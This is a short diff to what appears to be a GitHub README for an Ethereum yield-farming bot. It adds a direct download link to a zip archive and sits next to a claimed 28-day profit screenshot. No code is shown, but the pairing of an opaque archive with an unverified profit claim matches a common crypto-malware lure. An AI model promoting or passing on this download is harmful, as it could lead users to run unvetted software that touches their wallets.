@@ -8,7 +8,7 @@ I made this video tutorial on how to configure it and run it.
 
 
 You can download the zip file of it here
-
+https://github.com/SebastianTutorials/ETHEREUM-Yield-farming-bot-with-USDC-Stoploss/raw/main/Max-Yield-farming-bot-with-stoploss-volatility-protection.zip
 
 This is the profit I've made over 28-day test
 <img src="https://github.com/SebastianTutorials/ETHEREUM-Yield-farming-bot-with-USDC-Stoploss/raw/main/hju.png">
